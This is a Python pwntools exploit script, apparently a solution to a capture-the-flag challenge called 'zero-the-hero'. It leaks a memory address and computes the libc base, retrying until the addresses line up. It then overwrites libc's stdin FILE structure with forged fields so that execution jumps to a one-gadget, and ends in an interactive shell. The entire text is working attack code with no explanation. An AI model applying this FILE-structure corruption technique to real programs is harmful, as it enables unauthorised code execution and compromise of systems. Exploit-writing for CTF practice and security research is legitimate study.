#exploit for zero-the-hero
from pwn import *
while(True):
	target=process('./zero-the-hero')
	elf=ELF('./zero-the-hero')
	libc=elf.libc
	size=0x22000
	print(target.recvline())
	target.sendline(str(size))
	print(target.recvuntil(": "))
	leak=int(target.recvline().strip("\n")[2:],16)
	mmap_off=0x7f3f8d08d010-0x00007f3f8caae000
	libc_base=leak-mmap_off
	gadget=0x10a38c
	libc_gadget=libc_base+gadget
	libc_io_stdin=libc_base+libc.symbols["_IO_2_1_stdin_"]
	libc_target_addr=libc_io_stdin+0x41
	print(hex(libc_base))
	print(hex(libc_io_stdin))
	if(int(hex(libc_io_stdin)[10:12],16)<0x30):
		
		print(target.recvline())

		index=libc_target_addr-leak

		target.sendline(str(index))
		print(target.recvline())

		data="\x00"+p32(0)+p64(libc_io_stdin+0x1ed0)+p64(0xffffffffffffffff)+p64(0)+p64(libc_io_stdin+0xe0)+p64(0)*3
		data+=p32(0xffffffff)+p32(0)+p64(0)*2+p64(libc_io_stdin-0x3760)+p64(0)*38+p64(libc_io_stdin-0x3ca0)+p64(0)
		data+=p64(libc_io_stdin-0x3545f0)+p64(libc_io_stdin-0x353270)+p64(libc_gadget)

		target.sendline(data)
		break
	else:
		target.close()
		continue
target.interactive()

